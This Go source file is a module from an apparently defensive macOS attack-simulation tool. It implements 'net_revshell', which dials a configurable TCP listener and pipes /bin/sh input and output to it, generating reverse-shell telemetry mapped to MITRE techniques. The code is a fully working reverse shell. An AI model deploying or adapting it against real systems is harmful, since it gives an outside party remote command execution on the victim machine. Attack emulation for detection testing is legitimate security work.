package network

import (
	"context"
	"fmt"
	"net"
	"os/exec"

	"github.com/0xv1n/macnoise/internal/output"
	"github.com/0xv1n/macnoise/pkg/module"
)

type netRevShell struct{}

func (n *netRevShell) Info() module.ModuleInfo {
	return module.ModuleInfo{
		Name:        "net_revshell",
		Description: "Spawns /bin/sh and pipes stdio to a remote TCP connection (telemetry simulation)",
		Category:    module.CategoryNetwork,
		Tags:        []string{"tcp", "reverse-shell", "execution"},
		Privileges:  module.PrivilegeNone,
		MITRE: []module.MITRE{
			{Technique: "T1059", SubTech: ".004", Name: "Command and Scripting Interpreter: Unix Shell"},
			{Technique: "T1071", Name: "Application Layer Protocol"},
		},
		Author:   "0xv1n",
		MinMacOS: "12.0",
	}
}

func (n *netRevShell) ParamSpecs() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "target", Description: "Listener IP (must have nc/socat listening)", Required: false, DefaultValue: "127.0.0.1", Example: "10.0.0.1"},
		{Name: "port", Description: "Listener port", Required: false, DefaultValue: "4444", Example: "4444"},
	}
}

func (n *netRevShell) CheckPrereqs() error { return nil }

func (n *netRevShell) Generate(ctx context.Context, params module.Params, emit module.EventEmitter) error {
	target := params.Get("target", "127.0.0.1")
	port := params.Get("port", "4444")
	address := net.JoinHostPort(target, port)

	info := n.Info()
	ev := output.NewEvent(info, "reverse_shell_attempt", false, fmt.Sprintf("connecting /bin/sh to %s", address))

	conn, err := net.Dial("tcp", address)
	if err != nil {
		ev = output.WithError(ev, err)
		ev.Success = true
		ev.Message = fmt.Sprintf("reverse shell attempt to %s (connection refused — no listener)", address)
		emit(ev)
		return nil
	}
	defer func() { _ = conn.Close() }()

	ev.Success = true
	ev.Message = fmt.Sprintf("reverse shell connected to %s, spawning /bin/sh", address)
	ev = output.WithDetails(ev, map[string]any{"address": address, "shell": "/bin/sh"})
	emit(ev)

	cmd := exec.CommandContext(ctx, "/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	_ = cmd.Run()

	return nil
}

func (n *netRevShell) DryRun(params module.Params) []string {
	target := params.Get("target", "127.0.0.1")
	port := params.Get("port", "4444")
	return []string{
		fmt.Sprintf("dial TCP %s:%s", target, port),
		"attach /bin/sh stdin/stdout/stderr to connection",
	}
}

func (n *netRevShell) Cleanup() error { return nil }

func init() {
	module.Register(&netRevShell{})
}
